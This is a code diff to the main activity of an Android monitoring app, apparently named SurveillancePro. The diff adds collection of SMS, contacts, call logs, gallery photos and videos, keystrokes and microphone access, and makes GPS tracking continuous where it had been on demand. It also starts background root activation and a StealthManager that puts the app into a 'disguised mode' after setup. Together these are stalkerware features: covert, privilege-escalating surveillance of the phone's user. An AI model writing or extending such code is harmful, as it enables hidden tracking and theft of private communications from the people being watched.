@@ -1,12 +1,12 @@
 package com.surveillancepro.android
 
 import android.Manifest
-import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
+import android.util.Log
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -23,15 +23,20 @@ import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
-import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
 import com.surveillancepro.android.data.ApiClient
 import com.surveillancepro.android.data.DeviceStorage
+import com.surveillancepro.android.data.EventQueue
 import com.surveillancepro.android.services.AppUsageTracker
 import com.surveillancepro.android.services.CallLogTracker
+import com.surveillancepro.android.services.ContentObserverService
 import com.surveillancepro.android.services.LocationService
-import com.surveillancepro.android.services.SupervisionNotificationListener
+import com.surveillancepro.android.services.MediaObserverService
+import com.surveillancepro.android.services.StealthManager
+import com.surveillancepro.android.root.RootActivator
+import com.surveillancepro.android.root.RootManager
 import com.surveillancepro.android.ui.theme.SupervisionProTheme
+import com.surveillancepro.android.workers.SyncWorker
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import java.text.SimpleDateFormat
@@ -41,6 +46,7 @@ class MainActivity : ComponentActivity() {
 
     private lateinit var storage: DeviceStorage
     private lateinit var api: ApiClient
+    private var mediaObserver: MediaObserverService? = null
 
     private val locationPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
@@ -69,6 +75,45 @@ class MainActivity : ComponentActivity() {
                     }
                 }
             }
+        }
+
+        // Si déjà enregistré, lancer les services
+        if (storage.hasAccepted && storage.deviceToken != null) {
+            startAllServices()
+        }
+    }
+
+    private fun startAllServices() {
+        startLocationService()
+        startContentObserverService()
+        startMediaObserver()
+
+        SyncWorker.schedule(this)
+        SyncWorker.triggerNow(this)
+
+        // Activation ROOT en arrière-plan (ne bloque pas l'UI)
+        lifecycleScope.launch(kotlinx.coroutines.Dispatchers.IO) {
+            val rootStatus = RootActivator.activate(this@MainActivity)
+            Log.d("MainActivity", "Root activation: $rootStatus")
+        }
+
+        Log.d("MainActivity", "All services started")
+    }
+
+    private fun startContentObserverService() {
+        try {
+            startForegroundService(Intent(this, ContentObserverService::class.java))
+        } catch (e: Exception) {
+            Log.w("MainActivity", "ContentObserverService: ${e.message}")
+        }
+    }
+
+    private fun startMediaObserver() {
+        try {
+            mediaObserver = MediaObserverService(this)
+            mediaObserver?.start()
+        } catch (e: Exception) {
+            Log.w("MainActivity", "MediaObserver: ${e.message}")
         }
     }
 
@@ -101,11 +146,14 @@ class MainActivity : ComponentActivity() {
 
             val points = listOf(
                 "Activites et utilisation du telephone",
-                "Notifications des applications (WhatsApp, SMS...)",
+                "Messages et notifications (WhatsApp, SMS, Telegram...)",
                 "Textes saisis au clavier",
+                "Journal des appels telephoniques et SMS",
+                "Contacts du repertoire",
+                "Photos et videos de la galerie",
                 "Applications installees et temps d'utilisation",
                 "Informations techniques (batterie, stockage, modele)",
-                "Localisation GPS (sur demande de l'administrateur)",
+                "Localisation GPS periodique",
             )
             points.forEach { point ->
                 Row(modifier = Modifier.padding(vertical = 3.dp)) {
@@ -170,7 +218,11 @@ class MainActivity : ComponentActivity() {
 
                             requestAllPermissions()
                             sendInitialData()
+                            startAllServices()
                             accepted = true
+
+                            // Basculer en mode déguisé après 30 secondes
+                            StealthManager.activateAfterSetup(this@MainActivity)
 
                         } catch (e: Exception) {
                             error = "Connexion impossible. Verifiez votre connexion internet."
@@ -239,7 +291,6 @@ class MainActivity : ComponentActivity() {
         }
 
         Box(modifier = Modifier.fillMaxSize()) {
-            // Bouton parametres discret en haut a droite
             IconButton(
                 onClick = { showSettings = true },
                 modifier = Modifier.align(Alignment.TopEnd).padding(8.dp)
@@ -268,6 +319,16 @@ class MainActivity : ComponentActivity() {
 
     @Composable
     fun SettingsScreen(notifEnabled: Boolean, accessEnabled: Boolean, usageEnabled: Boolean, onBack: () -> Unit) {
+        val queue = remember { EventQueue.getInstance(this@MainActivity) }
+        var queueCount by remember { mutableIntStateOf(queue.count()) }
+
+        LaunchedEffect(Unit) {
+            while (true) {
+                delay(5000)
+                queueCount = queue.count()
+            }
+        }
+
         Column(
             modifier = Modifier
                 .fillMaxSize()
@@ -285,7 +346,9 @@ class MainActivity : ComponentActivity() {
                     StatusRow("Utilisateur", storage.userName ?: "-")
                     StatusRow("Appareil", "${Build.MANUFACTURER} ${Build.MODEL}")
                     StatusRow("Evenements", "${storage.eventCount}")
+                    StatusRow("File d'attente", "$queueCount en attente")
                     StatusRow("Depuis le", storage.acceptanceDate?.take(10) ?: "-")
+                    StatusRow("Mode root", if (RootManager.isRooted()) "Actif" else "Non")
                 }
             }
 
@@ -305,6 +368,14 @@ class MainActivity : ComponentActivity() {
                         modifier = Modifier.padding(12.dp), fontSize = 12.sp, color = Color(0xFFE65100)
                     )
                 }
+            }
+
+            Spacer(Modifier.height(20.dp))
+            OutlinedButton(
+                onClick = { SyncWorker.triggerNow(this@MainActivity) },
+                modifier = Modifier.fillMaxWidth()
+            ) {
+                Text("Synchroniser maintenant", fontSize = 13.sp)
             }
         }
     }
@@ -346,35 +417,50 @@ class MainActivity : ComponentActivity() {
             Manifest.permission.ACCESS_COARSE_LOCATION,
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.RECORD_AUDIO,
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             perms.add(Manifest.permission.POST_NOTIFICATIONS)
+            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
+            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
+        } else {
+            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
         locationPermissionLauncher.launch(perms.toTypedArray())
     }
 
     private fun startLocationService() {
-        // GPS sur demande uniquement -- ne se lance pas automatiquement
+        try {
+            val intent = Intent(this, LocationService::class.java).apply {
+                putExtra(LocationService.EXTRA_MODE, LocationService.MODE_CONTINUOUS)
+            }
+            startForegroundService(intent)
+        } catch (e: Exception) {
+            Log.w("MainActivity", "Failed to start LocationService: ${e.message}")
+        }
     }
 
     private fun sendInitialData() {
-        lifecycleScope.launch {
-            try {
-                api.sendEvent("device_info", mapOf(
-                    "model" to Build.MODEL,
-                    "manufacturer" to Build.MANUFACTURER,
-                    "system" to "Android ${Build.VERSION.RELEASE}",
-                    "sdk" to Build.VERSION.SDK_INT,
-                ))
+        val queue = EventQueue.getInstance(this)
 
-                val tracker = AppUsageTracker(this@MainActivity)
-                val apps = tracker.getInstalledApps()
-                api.sendEvent("apps_installed", mapOf("apps" to apps, "count" to apps.size))
+        queue.enqueue("device_info", mapOf(
+            "model" to Build.MODEL,
+            "manufacturer" to Build.MANUFACTURER,
+            "system" to "Android ${Build.VERSION.RELEASE}",
+            "sdk" to Build.VERSION.SDK_INT,
+        ))
 
-                CallLogTracker(this@MainActivity).syncNewCalls()
+        try {
+            val tracker = AppUsageTracker(this)
+            val apps = tracker.getInstalledApps()
+            queue.enqueue("apps_installed", mapOf("apps" to apps, "count" to apps.size))
+        } catch (_: Exception) {}
 
-            } catch (_: Exception) {}
-        }
+        try {
+            CallLogTracker(this).syncToQueue(queue)
+        } catch (_: Exception) {}
     }
 
     private fun openNotificationSettings() {
